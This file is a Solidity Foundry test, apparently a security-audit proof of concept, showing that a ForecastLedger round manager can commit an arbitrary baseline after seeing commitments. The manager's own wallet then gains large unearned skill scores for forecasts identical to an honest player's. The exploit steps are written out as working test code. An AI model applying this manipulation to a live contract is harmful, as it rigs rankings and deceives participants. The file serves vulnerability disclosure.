// SPDX-License-Identifier: MIT
pragma solidity 0.8.39;

import {Base} from "../Base.t.sol";
import {ForecastLedger} from "../../src/ForecastLedger.sol";

/// @dev PoC: the round manager picks the baseline vector freely (nothing onchain ties it to a market price or to
/// the last minutes before the deadline), and it sees who has committed before it commits the baseline. A wrong
/// baseline turns "copy the market" into large positive skill in the rounds the manager chooses.
contract BaselineContentPoC is Base {
    function test_poc_managerMintsSkillWithArbitraryBaseline() public {
        uint256[] memory p = new uint256[](1);
        bool[] memory yes = new bool[](1);
        yes[0] = true;

        // Round 1, honest keeper: market says 95%, baseline 9500. Alice copies the market: zero skill.
        (uint256 r1, ForecastLedger.QuestionInput[] memory q1) = _createRound(1);
        p[0] = 9500;
        _commit(r1, alice, _pack(p), "a");
        _commitBaseline(r1, _pack(p), "k");

        // Round 2: same kind of 95% market. The manager commits a 50% baseline right at creation (no timing rule
        // onchain) after which its own wallet (bob) simply copies the market.
        (uint256 r2, ForecastLedger.QuestionInput[] memory q2) = _createRound(1);
        uint256[] memory fake = new uint256[](1);
        fake[0] = 5000;
        _commitBaseline(r2, _pack(fake), "k");
        _commit(r2, bob, _pack(p), "b");

        _toReveal(r1);
        ledger.revealFor(r1, alice, _pack(p), "a");
        ledger.revealFor(r2, bob, _pack(p), "b");
        vm.startPrank(keeper);
        ledger.revealBaseline(r1, _pack(p), "k");
        ledger.revealBaseline(r2, _pack(fake), "k");
        vm.stopPrank();
        _resolveAndFinalize(r1, q1, yes);
        _resolveAndFinalize(r2, q2, yes);
        _toScoring(r2);
        ledger.score(r1, alice);
        ledger.score(r2, bob);

        // Identical forecasts, identical outcomes, identical Brier; skill differs only by the manager's baseline.
        assertEq(ledger.getStats(alice).sumBrier, ledger.getStats(bob).sumBrier);
        assertEq(ledger.getStats(alice).sumSkill, 0);
        assertEq(ledger.getStats(bob).sumSkill, int64(2500 * 2500 * 4 - 500 * 500)); // 5000^2 minus 500^2
        assertEq(ledger.getStats(bob).sumSkill, 24_750_000);
    }
}
